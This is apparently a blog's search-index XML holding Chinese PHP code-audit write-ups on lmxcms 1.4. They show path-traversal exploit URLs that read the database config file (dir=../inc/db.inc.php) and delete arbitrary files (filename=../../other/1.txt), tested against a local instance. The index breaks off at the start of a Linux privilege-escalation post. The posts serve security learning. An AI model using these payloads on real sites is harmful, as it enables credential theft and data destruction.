<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php代码审计-文件安全(2)</title>
    <link href="/2023/07/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/"/>
    <url>/2023/07/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/</url>
    
    <content type="html"><![CDATA[<p>php代码审计</p><p>梦想cms任意文件读取漏洞</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/image-20230723095830899.png" alt="image-20230723095830899"></p><p>从危害等级来看，估计也是在后台，我们直接从后台来看一看</p><p>这里也是先给出文件读取相关的函数</p><p>在 PHP 中，文件读取相关的函数主要有以下几个：</p><p>1.fopen() 函数：用于打开一个文件，并返回一个文件指针。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$fp = fopen($filename, $mode);<br></code></pre></td></tr></table></figure><p>其中，$filename 是要打开的文件名，可以是相对路径或绝对路径；$mode 是打开文件的模式，包括 “r”（只读）、”w”（只写）、”a”（追加）等多种模式。</p><p>2.fgets() 函数：用于从文件指针中读取一行数据。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$line = fgets($fp);<br></code></pre></td></tr></table></figure><p>其中，$fp 是文件指针，可以是通过 fopen() 打开的一个文件句柄；$line 是从文件指针中读取到的一行数据，包括行末换行符（\n）。</p><p>3.fread() 函数：用于从文件指针中读取指定长度的数据。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$data = fread($fp, $length);<br></code></pre></td></tr></table></figure><p>其中，$fp 是文件指针，可以是通过 fopen() 打开的一个文件句柄；$length 是要读取的数据长度，单位为字节；$data 是从文件指针中读取到的数据。</p><p>4.file_get_contents() 函数：用于一次性读取整个文件到一个字符串中。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$data = file_get_contents($filename);<br></code></pre></td></tr></table></figure><p>其中，$filename 是要读取的文件名，可以是相对路径或绝对路径；$data 是读取到的文件内容。</p><p>需要注意的是，在实际编程中，应该谨慎处理文件读取操作，并进行错误处理和异常情况的处理。同时，还应该遵循最佳安全实践，例如对文件路径进行验证和过滤、限制文件访问权限、加密敏感信息等，以确保系统的稳定性和安全性。</p><p>5.file() 函数：用于将整个文件读入一个数组中。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$lines = file($filename, $flags);<br></code></pre></td></tr></table></figure><p>其中，$filename 是要读取的文件名，可以是相对路径或绝对路径；$flags 是可选参数，用于指定读取方式和处理方法，例如忽略空行、保留换行符等。</p><p>6.fgets() 和 feof() 函数的结合使用：用于逐行读取文件，直到文件结束。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码$fp = fopen($filename, &quot;r&quot;);<br>while (!feof($fp)) &#123;<br>    $line = fgets($fp);<br>    // 处理每一行数据<br>&#125;<br>fclose($fp);<br></code></pre></td></tr></table></figure><p>其中，$filename 是要读取的文件名，可以是相对路径或绝对路径；$fp 是通过 fopen() 函数打开的文件句柄；feof() 函数用于检测文件是否已经结束。</p><p>7.readfile() 函数：用于将文件内容输出到输出缓冲区。语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php复制代码readfile($filename);<br></code></pre></td></tr></table></figure><p>其中，$filename 是要读取的文件名，可以是相对路径或绝对路径。readfile() 函数会自动将文件内容输出到输出缓冲区，并返回读取到的字节数。</p><p>这里我在vscode里面全局搜索一下（之前install文件已经被删除了，所以搜索到的可能少一些）</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690079285982-19101352-a2a7-4233-912f-961c1a570bf8.png" alt="img"></p><p>这里可以发现，一个在php文件中，一个在js文件中，肯定是在php文件中的可能性大一些，，进入php文件看一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//获取文件内容</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getcon</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$path</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>))&#123;<br>            rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;请检查【&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;】是否有读取权限&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;请检查【&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;】文件是否存在&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体来说，这个方法首先使用 is_file() 函数检查 $path 是否是一个文件，如果不是，则使用 rewrite::js_back() 方法返回一个 JavaScript 弹窗提示信息，内容为 ‘请检查【’.$path.’】文件是否存在’。如果 $path 是一个文件，则继续执行后续代码逻辑。</p><p>接下来，使用 file_get_contents() 函数读取文件内容，并将结果存储到 $content 变量中。如果读取失败，则使用 rewrite::js_back() 方法返回一个 JavaScript 弹窗提示信息，内容为 ‘请检查【’.$path.’】是否有读取权限’。否则，该方法返回读取到的文件内容。</p><p>到这里有两种思路，是看传参还是看函数的调用，但是仔细看一下代码，我们会发现没有可以控制的变量，所以直接在网页传参测试是不可以的，于是我选择看一下函数的调用</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690081096778-42d336f6-2883-4b84-9bed-5e0c9edf5433.png" alt="img"></p><p>我们在全文搜索一下getcon</p><p>注意要全字匹配，不然会出现很多</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690083015503-a0c0f395-0a29-470a-b644-03997042ad07.png" alt="img"></p><p>这里在两个地方发现了getcon，一个是本身，一个是temp那个地方调用了，我们去一下temp看一下</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690083108592-0f524094-27a1-4b78-84c4-11f41aa0c420.png" alt="img"></p><p>在这里我们找到了可控变量dir</p><p>在注释中我们看到了很多模板这种字样，估计是在模板功能里面我们找一下就找到了相关链接</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690083662669-3d4e55d3-3db2-4576-b109-a1efb8baf80b.png" alt="img"></p><p>点击编辑之后会传递以下的url</p><p><a href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=default/error.html">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&amp;a=editfile&amp;dir=default/error.html</a></p><p>问题来了，我们需要知道$this-&gt;config[‘template’]的值是多少，因为查看文件的路径是这样的</p><p>$this-&gt;config[‘template’].$dir</p><p>后面的dir部分是可控的，但是前面的$this-&gt;config[‘template’]部分我们不知道值是什么，来解决这个问题</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690083910440-218d3306-db0b-4516-92d9-c916a092bee5.png" alt="img"></p><p>我们稍微修改一下源码，本来的源码是下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editfile</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-comment">//保存修改</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;settemcontent&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&#x27;template_edit&#x27;</span>])&#123;<br>            rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;系统设置禁止修改模板文件&#x27;</span>);<br>        &#125;<br>        file::<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;temcontent&#x27;</span>]));<br>        <span class="hljs-title function_ invoke__">addlog</span>(<span class="hljs-string">&#x27;修改模板文件&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>);<br>        rewrite::<span class="hljs-title function_ invoke__">succ</span>(<span class="hljs-string">&#x27;修改成功&#x27;</span>,<span class="hljs-string">&#x27;?m=Template&amp;a=opendir&amp;dir=&#x27;</span>.<span class="hljs-variable">$dir</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$pathinfo</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$dir</span>);<br>    <span class="hljs-comment">//获取文件内容</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">html_char</span>(file::<span class="hljs-title function_ invoke__">getcon</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>));<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-variable">$pathinfo</span>[<span class="hljs-string">&#x27;basename&#x27;</span>]);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;temcontent&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]));<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;Template/temedit.html&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来稍稍修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editfile</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-comment">//保存修改</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;settemcontent&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&#x27;template_edit&#x27;</span>])&#123;<br>            rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;系统设置禁止修改模板文件&#x27;</span>);<br>        &#125;<br>        file::<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;temcontent&#x27;</span>]));<br>        <span class="hljs-title function_ invoke__">addlog</span>(<span class="hljs-string">&#x27;修改模板文件&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>);<br>        rewrite::<span class="hljs-title function_ invoke__">succ</span>(<span class="hljs-string">&#x27;修改成功&#x27;</span>,<span class="hljs-string">&#x27;?m=Template&amp;a=opendir&amp;dir=&#x27;</span>.<span class="hljs-variable">$dir</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$pathinfo</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$dir</span>);<br>    <span class="hljs-comment">//获取文件内容</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">html_char</span>(file::<span class="hljs-title function_ invoke__">getcon</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-variable">$pathinfo</span>[<span class="hljs-string">&#x27;basename&#x27;</span>]);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;temcontent&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]));<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;Template/temedit.html&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来访问一下下面这个构建好的链接，弹出了$this-&gt;config[‘template’]的值</p><p><a href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=1">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&amp;a=editfile&amp;dir=1</a></p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690083825255-b33091ba-572d-4e98-b87c-d4a2ebe7d856.png" alt="img"></p><p>ok这样子我们就知道了前面的值是什么了</p><p>D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;lmxcms1.4&#x2F;template</p><p>访问下面的链接，就可以得到指定文件的内容</p><p><a href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=../inc/db.inc.php">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&amp;a=editfile&amp;dir=../inc/db.inc.php</a></p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2/1690090443190-5cbf3b7b-341a-49e5-a5ea-fb2d82b1673f.png" alt="img"></p><p>到这里该1day就审计结束了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x06-代码审计</category>
      
      <category>0x01-php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php代码审计(文件安全)</title>
    <link href="/2023/07/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <url>/2023/07/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h2><h3 id="cnvd梦想cms文件删除漏洞"><a href="#cnvd梦想cms文件删除漏洞" class="headerlink" title="cnvd梦想cms文件删除漏洞"></a>cnvd梦想cms文件删除漏洞</h3><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038220720-667d7bc8-c853-4d0b-8cb8-f223b5595188.png" alt="img"></p><p>漏洞描述中说的是Ba*** 存在任意文件删除漏洞</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038467679-bf62f9dc-a2e8-4a66-9c5a-ea0ce9c59050.png" alt="img"></p><p>在源码中可以看到在后台中只存在两个ba开头的文件，那漏洞就一定存在于其中之一了</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038593756-c4cea59d-25fc-4be2-9470-7dc48d1d3e09.png" alt="img"></p><p>我的思路是直接搜一波删除，在备注中发现back****文件中删除的功能较多，优先审计这边</p><p>这边先给出php中删除的函数</p><p>在 PHP 中，删除文件的函数主要有以下几种：</p><p>1.unlink() 函数：使用 unlink() 函数可以删除指定路径下的文件。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">$file = &#x27;/path/to/file.txt&#x27;;<br>if (!unlink($file)) &#123;<br>    echo &quot;Error deleting $file&quot;;<br>&#125; else &#123;<br>    echo &quot;$file deleted&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.rmdir() 函数：使用 rmdir() 函数可以删除指定路径下的空目录。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">$dir = &#x27;/path/to/empty/dir&#x27;;<br>if (!rmdir($dir)) &#123;<br>    echo &quot;Error deleting $dir&quot;;<br>&#125; else &#123;<br>    echo &quot;$dir deleted&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.unlink() 和 rmdir() 的结合使用：如果要删除非空目录，则需要先递归地删除目录中的所有文件和子目录，然后再删除该目录本身。可以使用 unlink() 和 rmdir() 的结合使用来实现这个功能。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">function deleteDirectory($dir) &#123;<br>    if (!file_exists($dir)) &#123;<br>        return true;<br>    &#125;<br><br>    if (!is_dir($dir)) &#123;<br>        return unlink($dir);<br>    &#125;<br><br>    foreach (scandir($dir) as $item) &#123;<br>        if ($item == &#x27;.&#x27; || $item == &#x27;..&#x27;) &#123;<br>            continue;<br>        &#125;<br>        <br>        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) &#123;<br>            return false;<br>        &#125;<br>    &#125;<br><br>    return rmdir($dir);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039100096-f68014cf-1b90-4e1f-a2ef-0ea45cb15417.png" alt="img"></p><p>搜索了一下，发现有四处存在unlink函数，上面三个函数都太大了，先从小的开始分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delOne</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>  <span class="hljs-variable">$dir</span> = ROOT_PATH.<span class="hljs-string">&#x27;file/back/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br>  file::<span class="hljs-title function_ invoke__">unLink</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码看起来是一个 PHP 类中的私有方法，用于删除指定文件名 $filename 所代表的文件。</p><p>具体来说，这个方法首先使用 ROOT_PATH 常量拼接出要删除的文件的完整路径，即 ROOT_PATH.’file&#x2F;back&#x2F;‘.$filename。然后，使用 file::unLink() 静态方法，调用 PHP 内置的 unlink() 函数来删除该文件。</p><p>该函数名为delOne，在本文件中查找那些地方调用了该函数</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039928024-78b40566-58e0-4cfb-837d-eac8dcb323c3.png" alt="img"></p><p>我们先来看第一个delbackdb函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delbackdb</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$filename</span>)&#123;<br>        rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;备份文件不存在&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">delOne</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">addlog</span>(<span class="hljs-string">&#x27;删除数据库备份文件&#x27;</span>);<br>    rewrite::<span class="hljs-title function_ invoke__">succ</span>(<span class="hljs-string">&#x27;删除成功&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码看起来是一个 PHP 类中的公有方法，用于删除指定的数据库备份文件。</p><p>具体来说，这个方法首先通过 trim() 函数去掉 $_GET[‘filename’] 变量中的空格和换行符等不必要的字符，并将处理结果存储到 $filename 变量中。然后，判断 $filename 变量是否为空，如果为空，则使用 rewrite::js_back() 方法返回一个错误提示信息。</p><p>如果 $filename 变量不为空，则调用 $this-&gt;delOne($filename) 方法来删除该文件。删除完成后，使用 addlog() 方法记录一条日志，表示成功删除了数据库备份文件；然后使用 rewrite::succ() 方法显示一个成功提示信息。</p><p>那这里就很明确了，delbackdb函数中会调用delOne删除掉指定的文件，而delOne函数中</p><p>$dir &#x3D; ROOT_PATH.’file&#x2F;back&#x2F;‘.$filename;</p><p>受制于file&#x2F;back的限制，只能删除该文件夹下面的文件，那该如何绕过呢？当然是..&#x2F;..&#x2F;啦</p><p>ok分析完毕，来尝试一波</p><p>先找到删除备份文件的功能点正常删除一波找到删除的数据包</p><p>是下面这种形式的，看这些传递的参数也非常熟悉</p><p><a href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&a=delbackdb&filename=xxxxx.txt">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&amp;a=delbackdb&amp;filename=xxxxx.txt</a></p><p>这里我在other下新建一个1.txt文件我们来看一下能不能删掉</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230723094946209.png" alt="image-20230723094946209"></p><p><a href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&a=delbackdb&filename=../../other/1.txt">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&amp;a=delbackdb&amp;filename=../../other/1.txt</a></p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076732089-1401b077-148b-4b48-a868-fffdfdde628e.png" alt="img"></p><p>再回来看，1.txt已经被删除了</p><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076767740-f8a12e4b-9727-49ab-8f0a-02c0a527ad8f.png" alt="img"></p><p>到此这个1day就审计结束了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x06-代码审计</category>
      
      <category>0x01-php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权(1)</title>
    <link href="/2023/07/22/Linux%E6%8F%90%E6%9D%83-1/"/>
    <url>/2023/07/22/Linux%E6%8F%90%E6%9D%83-1/</url>
    
    <content type="html"><![CDATA[<p>在本篇文章中总结一些基础的Linux特权提升</p><h3 id="先介绍几个工具"><a href="#先介绍几个工具" class="headerlink" title="先介绍几个工具"></a>先介绍几个工具</h3><p>LinPEAS      LinEnum</p><p>LinPEAS 是一种 Linux 版本的 Privilege Escalation 检测脚本，它可以在目标 Linux 系统上自动执行大量的信息收集和安全检查任务，并生成详细的报告，以帮助渗透测试人员识别并利用潜在的权限提升漏洞。LinPEAS 可以递归地搜索目标文件系统中的所有目录和文件，并执行各种命令和脚本来检查系统配置、进程、用户、SUID&#x2F;SGID 文件、可写文件、定时任务、未知的网络连接等方面的安全问题。与其他 Privilege Escalation 工具相比，LinPEAS 的最大优势在于其自动化和全面性，它可以极大地简化安全测试流程，同时提高了测试的准确性和深度。</p><p>LinEnum 是一个用于 Linux 系统的脚本，它可以帮助系统管理员和渗透测试人员快速识别目标主机上的潜在漏洞和攻击面。该脚本可以自动执行各种枚举和信息收集任务，并生成详细的报告。LinEnum 脚本可以检查系统配置、系统用户、正在运行的服务、系统进程、底层文件和文件系统权限等方面的安全问题。最重要的是，LinEnum 可以通过简单明了的结果输出方式帮助用户快速定位漏洞和攻击面，使得系统管理员和渗透测试人员可以更加高效地发现并修复潜在的安全威胁。</p><h2 id="cron任务，这些文件每隔一段时间都会被执行"><a href="#cron任务，这些文件每隔一段时间都会被执行" class="headerlink" title="cron任务，这些文件每隔一段时间都会被执行"></a>cron任务，这些文件每隔一段时间都会被执行</h2><h3 id="1-替换文件提权"><a href="#1-替换文件提权" class="headerlink" 